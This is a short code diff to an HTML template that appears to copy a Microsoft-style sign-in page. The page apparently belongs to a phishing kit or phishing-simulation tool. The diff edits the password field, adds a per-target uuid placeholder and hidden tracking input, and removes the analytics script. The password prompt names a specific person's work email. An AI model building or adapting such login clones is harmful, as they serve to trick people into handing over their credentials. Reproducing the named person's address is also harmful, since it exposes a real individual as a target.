@@ -22,13 +22,6 @@
 
     <!-- Global site tag (gtag.js) - Google Analytics -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-DMYRD3W8H5"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag() { dataLayer.push(arguments); }
-        gtag('js', new Date());
-
-        gtag('config', 'G-DMYRD3W8H5');
-    </script>
     
 </head>
 
@@ -154,7 +147,7 @@
                                                             <div role="alert" aria-live="assertive">
                                                             </div>
                                                             <div class="placeholderContainer">
-                                                                <input name="passwd" type="password" id="i0118" autocomplete="off"
+                                                                <input name="password" type="password" id="password" autocomplete="off"
                                                                     class="form-control input ext-input text-box ext-text-box" aria-required="true"
                                                                     aria-describedby="loginHeader passwordError  " placeholder="Password"
                                                                     aria-label="Enter the password for leonardo.leao@wago.com" tabindex="0">
@@ -195,7 +188,7 @@
                                         </div>
                                         <a id="uuid" hidden>{{ uuid }}</a>
                                         <input type="hidden" name="frontendData"
-                                            data-bind="value: test" value="">
+                                            data-bind="value: test" value="empty">
                                         </div>
                                     </div>
                                     <div class="promoted-fed-cred-box ext-promoted-fed-cred-box">
